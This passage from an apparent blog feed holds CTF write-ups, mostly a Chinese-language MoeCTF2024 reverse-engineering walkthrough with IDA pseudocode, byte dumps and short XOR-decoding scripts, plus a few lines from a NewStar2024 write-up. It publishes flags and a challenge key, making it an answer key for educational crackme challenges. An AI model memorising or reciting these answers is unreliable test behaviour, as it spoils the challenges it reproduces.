Fl4g</p><p>flag{00e38ce2-8cdb-4351-903f-5fe85b2f2b46}</p><h4 id="pangba"><a href="#pangba" class="headerlink" title="pangba"></a>pangba</h4><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/32ef4d83c7523183b6d2ab6263ef4cd1_720.png" alt="img"></p><p>密钥喵：3YoHSWBKtPjWMUD5</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/06e6d4baa65f5cb324231a918d4ebc1c.png" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Newstar2024&quot;&gt;&lt;a href=&quot;#Newstar2024&quot; class=&quot;headerlink&quot; title=&quot;Newstar2024&quot;&gt;&lt;/a&gt;Newstar2024&lt;/h1&gt;&lt;h2 id=&quot;Week1&quot;&gt;&lt;a href=&quot;#Week1&quot; class</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>MoeCTF2024|Reverse</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/10/20/Moectf%202024%20%20Reverse/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/10/20/Moectf%202024%20%20Reverse/</id>
    <published>2024-10-19T16:00:00.000Z</published>
    <updated>2024-10-30T11:39:10.195Z</updated>
    
    <content type="html"><![CDATA[<h1 id="关于WP"><a href="#关于WP" class="headerlink" title="关于WP"></a>关于WP</h1><p>Author: 0xcafebabe<br>第三方题目（非XDSEC成员）:<br>1.xor(大嘘) (Author: 中国人民警察大学的：Chovy)<br>2.Cython-Strike: Bomb Defusion (Author: 西安电子科技大学的：不玩逆向爱玩CS的同学)</p><h1 id="入门指北"><a href="#入门指北" class="headerlink" title="入门指北"></a>入门指北</h1><p>下载PDF，了解里面关于XOR的讲解内容后，可以发现直接给出了解题代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> password_enc[] = &#123; </span><br><span class="line"><span class="number">123</span>, <span class="number">121</span>, <span class="number">115</span>, <span class="number">117</span>, <span class="number">98</span>, <span class="number">112</span>, <span class="number">109</span>, <span class="number">100</span>, <span class="number">37</span>, <span class="number">96</span>, <span class="number">37</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">37</span>, <span class="number">73</span>, <span class="number">39</span>,</span><br><span class="line"><span class="number">101</span>, <span class="number">73</span>, <span class="number">119</span>, <span class="number">73</span>, <span class="number">122</span>, <span class="number">121</span>, <span class="number">120</span>, <span class="number">113</span>, <span class="number">73</span>, <span class="number">122</span>, <span class="number">121</span>, <span class="number">120</span>, <span class="number">113</span>, <span class="number">73</span>, <span class="number">97</span>, <span class="number">119</span>, </span><br><span class="line"><span class="number">111</span>, <span class="number">73</span>, <span class="number">98</span>, <span class="number">121</span>, <span class="number">73</span>, <span class="number">115</span>, <span class="number">110</span>, <span class="number">102</span>, <span class="number">122</span>, <span class="number">121</span>, <span class="number">100</span>, <span class="number">115</span>, <span class="number">107</span>, <span class="number">22</span> &#125;;</span><br><span class="line"><span class="comment">// 因为a^b=c时, b^c=a, 所以我们可以这样还原数据:</span></span><br><span class="line"><span class="type">char</span> password[<span class="number">47</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">46</span>; i++) &#123;</span><br><span class="line">password[i] = password_enc[i] ^ <span class="number">22</span>;</span><br><span class="line">&#125;</span><br><span class="line">password[<span class="number">46</span>] = <span class="number">0</span>; <span class="comment">// 使用0字符来截断掉%s的无尽输出..</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, password); <span class="comment">// 哈哈，这就是本题的f l a g，自己运行一下交上去吧！</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以拿到flag<br><code>moectf&#123;r3v3rs3_1s_a_long_long_way_to_explore&#125;</code></p><h1 id="Xor"><a href="#Xor" class="headerlink" title="Xor"></a>Xor</h1><p>拿到附件后发现是Windows下的可执行文件(.exe)，我们载入IDA后可以观察到反编译的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 i; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> Buffer[<span class="number">16</span>]; <span class="comment">// [rsp+20h] [rbp-48h] BYREF</span></span><br><span class="line">  __int128 v7; <span class="comment">// [rsp+30h] [rbp-38h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+40h] [rbp-28h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+48h] [rbp-20h]</span></span><br><span class="line">  <span class="type">char</span> v10; <span class="comment">// [rsp+4Ch] [rbp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  sub_140001010(<span class="string">&quot;Input Your Flag moectf&#123;xxx&#125; (len = 45) \n&quot;</span>);</span><br><span class="line">  v8 = <span class="number">0LL</span>;</span><br><span class="line">  *(_OWORD *)Buffer = <span class="number">0LL</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0LL</span>;</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  v3 = _acrt_iob_func(<span class="number">0</span>);</span><br><span class="line">  fgets(Buffer, <span class="number">45</span>, v3);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt; <span class="number">44</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ((<span class="type">unsigned</span> __int8)Buffer[i] ^ <span class="number">0x24</span>) != byte_1400022B8[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_140001010(<span class="string">&quot;FLAG is wrong!\n&quot;</span>);</span><br><span class="line">      system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_140001010(<span class="string">&quot;FLAG is RIGHT!\n&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们注意到<code>  char Buffer[16]; // [rsp+20h] [rbp-48h] BYREF</code>这个变量的大小是16，但是下面<code>  fgets(Buffer, 45, v3);</code>的大小是45，可以推测这个变量的大小反编译错误了。我们按y改成45，再刷新看代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 i; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> Buffer[<span class="number">48</span>]; <span class="comment">// [rsp+20h] [rbp-48h] BYREF</span></span><br><span class="line"></span><br><span class="line">  sub_140001010(<span class="string">&quot;Input Your Flag moectf&#123;xxx&#125; (len = 45) \n&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(Buffer, <span class="number">0</span>, <span class="number">45</span>);</span><br><span class="line">  v3 = _acrt_iob_func(<span class="number">0</span>);</span><br><span class="line">  fgets(Buffer, <span class="number">45</span>, v3);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt; <span class="number">44</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ((<span class="type">unsigned</span> __int8)Buffer[i] ^ <span class="number">0x24</span>) != byte_1400022B8[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_140001010(<span class="string">&quot;FLAG is wrong!\n&quot;</span>);</span><br><span class="line">      system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_140001010(<span class="string">&quot;FLAG is RIGHT!\n&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现，下面那些由于反编译错误的变量消失了，这时我们可以看到程序主逻辑是异或0x24并且逐个与<code>byte_1400022B8</code>进行比较，我们双击byte_1400022B8。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.rdata:<span class="number">00000001400022B</span>8 ; _BYTE byte_1400022B8[<span class="number">56</span>]</span><br><span class="line">.rdata:<span class="number">00000001400022B</span>8 byte_1400022B8  db <span class="number">49</span>h, <span class="number">4B</span>h, <span class="number">41</span>h, <span class="number">47</span>h, <span class="number">50</span>h, <span class="number">42</span>h, <span class="number">5F</span>h, <span class="number">41</span>h, <span class="number">1</span>Ch, <span class="number">16</span>h, <span class="number">46</span>h</span><br><span class="line">.rdata:<span class="number">00000001400022B</span>8                                         ; DATA XREF: main+<span class="number">58</span>↑o</span><br><span class="line">.rdata:<span class="number">00000001400022</span>C3                 db <span class="number">10</span>h, <span class="number">13</span>h, <span class="number">1</span>Ch, <span class="number">40</span>h, <span class="number">9</span>, <span class="number">42</span>h, <span class="number">16</span>h, <span class="number">46</span>h, <span class="number">1</span>Ch, <span class="number">9</span>, <span class="number">2</span> dup(<span class="number">10</span>h)</span><br><span class="line">.rdata:<span class="number">00000001400022</span>CF                 db <span class="number">42</span>h, <span class="number">1</span>Dh, <span class="number">9</span>, <span class="number">46</span>h, <span class="number">15</span>h, <span class="number">2</span> dup(<span class="number">14</span>h), <span class="number">9</span>, <span class="number">17</span>h, <span class="number">16</span>h, <span class="number">14</span>h</span><br><span class="line">.rdata:<span class="number">00000001400022</span>DA                 db <span class="number">41</span>h, <span class="number">2</span> dup(<span class="number">40</span>h), <span class="number">16</span>h, <span class="number">14</span>h, <span class="number">47</span>h, <span class="number">12</span>h, <span class="number">40</span>h, <span class="number">14</span>h, <span class="number">59</span>h</span><br><span class="line">.rdata:<span class="number">00000001400022E4</span>                 db <span class="number">0</span>Ch <span class="title function_">dup</span><span class="params">(<span class="number">0</span>)</span></span><br></pre></td></tr></table></figure><p>发现这种形式，不方便抄出来，所以我们按U，他就会变成Undefined，再右键选中所有的，Convert拿出来成Python的List。<br>所以我们很容易写出EXP（解题脚本）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">enc = [<span class="number">0x49</span>, <span class="number">0x4B</span>, <span class="number">0x41</span>, <span class="number">0x47</span>, <span class="number">0x50</span>, <span class="number">0x42</span>, <span class="number">0x5F</span>, <span class="number">0x41</span>, <span class="number">0x1C</span>, <span class="number">0x16</span>, <span class="number">0x46</span>, <span class="number">0x10</span>, <span class="number">0x13</span>, <span class="number">0x1C</span>, <span class="number">0x40</span>, <span class="number">0x09</span>, <span class="number">0x42</span>, <span class="number">0x16</span>, <span class="number">0x46</span>, <span class="number">0x1C</span>, <span class="number">0x09</span>, <span class="number">0x10</span>, <span class="number">0x10</span>, <span class="number">0x42</span>, <span class="number">0x1D</span>, <span class="number">0x09</span>, <span class="number">0x46</span>, <span class="number">0x15</span>, <span class="number">0x14</span>, <span class="number">0x14</span>, <span class="number">0x09</span>, <span class="number">0x17</span>, <span class="number">0x16</span>, <span class="number">0x14</span>, <span class="number">0x41</span>, <span class="number">0x40</span>, <span class="number">0x40</span>, <span class="number">0x16</span>, <span class="number">0x14</span>, <span class="number">0x47</span>, <span class="number">0x12</span>, <span class="number">0x40</span>, <span class="number">0x14</span>, <span class="number">0x59</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i ^ <span class="number">0x24</span>), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="comment"># moectf&#123;e82b478d-f2b8-44f9-b100-320edd20c6d0&#125;</span></span><br></pre></td></tr></table></figure><p>所以Flag：<code>moectf&#123;e82b478d-f2b8-44f9-b100-320edd20c6d0&#125;</code></p><h1 id="upx"><a href="#upx" class="headerlink" title="upx"></a>upx</h1><p>github下载UPX，然后用命令行启动，upx -d，就可以解压程序，再拖入IDA，即可查看正确的flag。<br><code>moectf&#123;ec5390dd-f8cf-4b02-bc29-3bb0c5604c29&#125;</code></p><h1 id="dynamic"><a href="#dynamic" class="headerlink" title="dynamic"></a>dynamic</h1><p>程序要求我们进行动态调试，我们先载入IDA进行分析。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main_0</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// rdi</span></span><br><span class="line">  __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// [rsp+20h] [rbp+0h] BYREF</span></span><br><span class="line">  _BYTE v7[<span class="number">80</span>]; <span class="comment">// [rsp+28h] [rbp+8h] BYREF</span></span><br><span class="line">  _DWORD v8[<span class="number">56</span>]; <span class="comment">// [rsp+78h] [rbp+58h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3 = &amp;v6;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">34LL</span>; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v3 = <span class="number">-858993460</span>;</span><br><span class="line">    v3 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  j___CheckForDebuggerJustMyCode(&amp;unk_140022067, argv, envp);</span><br><span class="line">  v7[<span class="number">0</span>] = <span class="number">-94</span>;</span><br><span class="line">  v7[<span class="number">1</span>] = <span class="number">5</span>;</span><br><span class="line">  v7[<span class="number">2</span>] = <span class="number">105</span>;</span><br><span class="line">  v7[<span class="number">3</span>] = <span class="number">-117</span>;</span><br><span class="line">  v7[<span class="number">4</span>] = <span class="number">-38</span>;</span><br><span class="line">  v7[<span class="number">5</span>] = <span class="number">23</span>;</span><br><span class="line">  v7[<span class="number">6</span>] = <span class="number">5</span>;</span><br><span class="line">  v7[<span class="number">7</span>] = <span class="number">-31</span>;</span><br><span class="line">  v7[<span class="number">8</span>] = <span class="number">-36</span>;</span><br><span class="line">  v7[<span class="number">9</span>] = <span class="number">-52</span>;</span><br><span class="line">  v7[<span class="number">10</span>] = <span class="number">-52</span>;</span><br><span class="line">  v7[<span class="number">11</span>] = <span class="number">-63</span>;</span><br><span class="line">  v7[<span class="number">12</span>] = <span class="number">100</span>;</span><br><span class="line">  v7[<span class="number">13</span>] = <span class="number">116</span>;</span><br><span class="line">  v7[<span class="number">14</span>] = <span class="number">-6</span>;</span><br><span class="line">  v7[<span class="number">15</span>] = <span class="number">80</span>;</span><br><span class="line">  v7[<span class="number">16</span>] = <span class="number">-43</span>;</span><br><span class="line">  v7[<span class="number">17</span>] = <span class="number">-95</span>;</span><br><span class="line">  v7[<span class="number">18</span>] = <span class="number">-102</span>;</span><br><span class="line">  v7[<span class="number">19</span>] = <span class="number">-84</span>;</span><br><span class="line">  v7[<span class="number">20</span>] = <span class="number">-36</span>;</span><br><span class="line">  v7[<span class="number">21</span>] = <span class="number">-34</span>;</span><br><span class="line">  v7[<span class="number">22</span>] = <span class="number">100</span>;</span><br><span class="line">  v7[<span class="number">23</span>] = <span class="number">-65</span>;</span><br><span class="line">  v7[<span class="number">24</span>] = <span class="number">-108</span>;</span><br><span class="line">  v7[<span class="number">25</span>] = <span class="number">45</span>;</span><br><span class="line">  v7[<span class="number">26</span>] = <span class="number">35</span>;</span><br><span class="line">  v7[<span class="number">27</span>] = <span class="number">-13</span>;</span><br><span class="line">  v7[<span class="number">28</span>] = <span class="number">1</span>;</span><br><span class="line">  v7[<span class="number">29</span>] = <span class="number">-43</span>;</span><br><span class="line">  v7[<span class="number">30</span>] = <span class="number">98</span>;</span><br><span class="line">  v7[<span class="number">31</span>] = <span class="number">-56</span>;</span><br><span class="line">  v7[<span class="number">32</span>] = <span class="number">-22</span>;</span><br><span class="line">  v7[<span class="number">33</span>] = <span class="number">-83</span>;</span><br><span class="line">  v7[<span class="number">34</span>] = <span class="number">-46</span>;</span><br><span class="line">  v7[<span class="number">35</span>] = <span class="number">-42</span>;</span><br><span class="line">  v7[<span class="number">36</span>] = <span class="number">42</span>;</span><br><span class="line">  v7[<span class="number">37</span>] = <span class="number">80</span>;</span><br><span class="line">  v7[<span class="number">38</span>] = <span class="number">94</span>;</span><br><span class="line">  v7[<span class="number">39</span>] = <span class="number">107</span>;</span><br><span class="line">  v7[<span class="number">40</span>] = <span class="number">115</span>;</span><br><span class="line">  v7[<span class="number">41</span>] = <span class="number">12</span>;</span><br><span class="line">  v7[<span class="number">42</span>] = <span class="number">-3</span>;</span><br><span class="line">  v7[<span class="number">43</span>] = <span class="number">-116</span>;</span><br><span class="line">  v7[<span class="number">44</span>] = <span class="number">61</span>;</span><br><span class="line">  v7[<span class="number">45</span>] = <span class="number">56</span>;</span><br><span class="line">  v7[<span class="number">46</span>] = <span class="number">61</span>;</span><br><span class="line">  v7[<span class="number">47</span>] = <span class="number">-47</span>;</span><br><span class="line">  v8[<span class="number">0</span>] = <span class="number">-889275714</span>;</span><br><span class="line">  v8[<span class="number">1</span>] = <span class="number">-559038242</span>;</span><br><span class="line">  v8[<span class="number">2</span>] = <span class="number">866566</span>;</span><br><span class="line">  v8[<span class="number">3</span>] = <span class="number">1131796</span>;</span><br><span class="line">  sub_14001129E(v7, <span class="number">4294967284LL</span>, v8);</span><br><span class="line">  sub_1400113D4(<span class="string">&quot;What happened to my Flag?\n&quot;</span>);</span><br><span class="line">  sub_14001129E(v7, <span class="number">12LL</span>, v8);</span><br><span class="line">  sub_1400113D4(<span class="string">&quot;Your Flag has REencrypted.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现，<code>What happened to my Flag?</code>上下都有一个sub_14001129E的函数，我们对4294967284LL进行分析，可以知道它其实是-12(<code>0xFFFFFFF4LL</code>)，再点进去，可以观察到如下代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_140011820</span><span class="params">(<span class="type">int</span> *a1, __int64 a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+24h] [rbp+4h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [rsp+24h] [rbp+4h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [rsp+44h] [rbp+24h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// [rsp+44h] [rbp+24h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v8; <span class="comment">// [rsp+44h] [rbp+24h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v9; <span class="comment">// [rsp+64h] [rbp+44h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v10; <span class="comment">// [rsp+64h] [rbp+44h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> j; <span class="comment">// [rsp+84h] [rbp+64h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+84h] [rbp+64h]</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [rsp+A4h] [rbp+84h]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [rsp+A4h] [rbp+84h]</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// [rsp+C4h] [rbp+A4h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v16; <span class="comment">// [rsp+C4h] [rbp+A4h]</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// [rsp+194h] [rbp+174h]</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// [rsp+194h] [rbp+174h]</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// [rsp+194h] [rbp+174h]</span></span><br><span class="line">  <span class="type">int</span> v20; <span class="comment">// [rsp+194h] [rbp+174h]</span></span><br><span class="line">  <span class="type">int</span> v22; <span class="comment">// [rsp+1C8h] [rbp+1A8h]</span></span><br><span class="line">  <span class="type">int</span> v23; <span class="comment">// [rsp+1C8h] [rbp+1A8h]</span></span><br><span class="line"></span><br><span class="line">  v22 = a2;</span><br><span class="line">  result = j___CheckForDebuggerJustMyCode(&amp;unk_140022067, a2, a3);</span><br><span class="line">  <span class="keyword">if</span> ( v22 &lt;= <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v22 &lt; <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v23 = -v22;</span><br><span class="line">      v14 = <span class="number">52</span> / v23 + <span class="number">6</span>;</span><br><span class="line">      v10 = <span class="number">1131796</span> * v14;</span><br><span class="line">      v5 = *a1;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v16 = (v10 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">for</span> ( i = v23 - <span class="number">1</span>; i; --i )</span><br><span class="line">        &#123;</span><br><span class="line">          v7 = a1[i - <span class="number">1</span>];</span><br><span class="line">          v19 = a1[i]</span><br><span class="line">              - (((v7 ^ *(_DWORD *)(a3 + <span class="number">4LL</span> * (v16 ^ i &amp; <span class="number">3</span>))) + (v5 ^ v10)) ^ (((<span class="number">16</span> * v7) ^ (v5 &gt;&gt; <span class="number">3</span>))</span><br><span class="line">                                                                              + ((<span class="number">4</span> * v5) ^ (v7 &gt;&gt; <span class="number">5</span>))));</span><br><span class="line">          a1[i] = v19;</span><br><span class="line">          v5 = v19;</span><br><span class="line">        &#125;</span><br><span class="line">        v8 = a1[v23 - <span class="number">1</span>];</span><br><span class="line">        v20 = *a1</span><br><span class="line">            - (((v8 ^ *(_DWORD *)(a3 + <span class="number">4LL</span> * v16)) + (v5 ^ v10)) ^ (((<span class="number">16</span> * v8) ^ (v5 &gt;&gt; <span class="number">3</span>)) + ((<span class="number">4</span> * v5) ^ (v8 &gt;&gt; <span class="number">5</span>))));</span><br><span class="line">        *a1 = v20;</span><br><span class="line">        v5 = v20;</span><br><span class="line">        v10 -= <span class="number">1131796</span>;</span><br><span class="line">        result = (<span class="type">unsigned</span> <span class="type">int</span>)--v14;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v14 );</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v13 = <span class="number">52</span> / v22 + <span class="number">6</span>;</span><br><span class="line">    v9 = <span class="number">0</span>;</span><br><span class="line">    v6 = a1[v22 - <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v9 += <span class="number">1131796</span>;</span><br><span class="line">      v15 = (v9 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">      <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v22 - <span class="number">1</span>; ++j )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = a1[j + <span class="number">1</span>];</span><br><span class="line">        v17 = (((v6 ^ *(_DWORD *)(a3 + <span class="number">4LL</span> * (v15 ^ j 